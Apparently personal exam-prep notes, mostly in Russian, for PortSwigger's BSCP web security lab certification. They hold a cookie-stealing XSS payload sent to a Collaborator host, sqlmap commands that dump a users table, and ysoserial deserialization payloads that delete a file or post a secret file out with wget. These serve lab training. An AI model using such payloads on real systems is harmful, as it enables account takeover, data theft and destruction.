# BSCP-PREP-NOTES
BSCP NOTES PREPAPATION

🧠 BSCP / PortSwigger — Stage 1 Mindset & Payload Notes
🔑 Stage 1 — Initial Access Philosophy

Первые шаги почти всегда связаны с кражей cookies.
Неважно, какая уязвимость используется — ключевое слово: cookies.

Любая уязвимость на Stage 1 должна рассматриваться как способ:

получить cookies жертвы

перехватить сессию

захватить аккаунт

перейти к privilege escalation

🧩 Что может быть на Stage 1
📌 Cache / Poisoning / Smuggling

PortSwigger Lab: Web cache poisoning with an unkeyed header
⚠️ Обязательно использовать Burp Collaborator

PortSwigger Lab: Basic password reset poisoning

PortSwigger Lab: Password reset poisoning via middleware

PortSwigger Lab: Exploiting HTTP request smuggling to capture other users' requests
📝 Комментарии + корректная работа с Content-Length
(см. notes)

💉 XSS → Cookie Exfiltration (Classic Payload)
<script>
location="https://TARGET.web-security-academy.net/?find=%22%7D%3Blocation%3D%22https%3A//YOUR-COLLABORATOR.oastify.com/%3F%22%2Bdocument.cookie%3B%2F%2F";
</script>


📌 Используется для:

кражи cookies

привязки сессии

дальнейшего lateral movement

🗄️ SQL Injection (sqlmap examples)
🔍 Enumerate databases
sqlmap -u "https://TARGET.web-security-academy.net/filtered_search?find=test&organize=5&order=ASC&BlogArtist=test" \
-p "order" \
--cookie="_lab=LAB_COOKIE; session=SESSION_COOKIE" \
--batch --random-agent --level 5 --risk 3 --dbs

📤 Dump users table
sqlmap -u "https://TARGET.web-security-academy.net/filtered_search?find=test&organize=5&order=ASC&BlogArtist=test" \
-p "order" \
--cookie="_lab=LAB_COOKIE; session=SESSION_COOKIE" \
--batch --random-agent --level 5 --risk 3 \
-D public -T users --dump

☕ Java Deserialization (ysoserial)

⚠️ ВАЖНО

Payload должен быть в одну строку

Payload обязательно URL-encode

Часто используется base64 / gzip

🧨 Delete file payload
java --add-opens=java.xml/com.sun.org.apache.xalan.internal.xsltc.trax=ALL-UNNAMED \
--add-opens=java.xml/com.sun.org.apache.xalan.internal.xsltc.runtime=ALL-UNNAMED \
--add-opens=java.base/java.lang=ALL-UNNAMED \
--add-opens=java.base/java.util=ALL-UNNAMED \
--add-opens=java.base/java.net=ALL-UNNAMED \
-jar ysoserial-all.jar CommonsCollections4 \
'rm /home/carlos/morale.txt' | base64

📡 Exfiltrate secret via Collaborator
java --add-opens=java.xml/com.sun.org.apache.xalan.internal.xsltc.trax=ALL-UNNAMED \
--add-opens=java.xml/com.sun.org.apache.xalan.internal.xsltc.runtime=ALL-UNNAMED \
--add-opens=java.base/java.lang=ALL-UNNAMED \
--add-opens=java.base/java.util=ALL-UNNAMED \
--add-opens=java.base/java.net=ALL-UNNAMED \
-jar ysoserial-all.jar CommonsCollections2 \
'wget http://YOUR-COLLABORATOR.oastify.com --post-file=/home/carlos/secret' \
| gzip -c -f | base64 -w 0

⚠️ Критические напоминания

❗ ВСЕ PAYLOAD’Ы — В ОДНУ СТРОКУ

❗ ВСЕ PAYLOAD’Ы — URL ENCODE

❗ Проверяй Content-Length

❗ Всегда смотри на cookies и session handling

🔐 Brute Force

🛠️ Скрипты для:

brute-force username

brute-force password
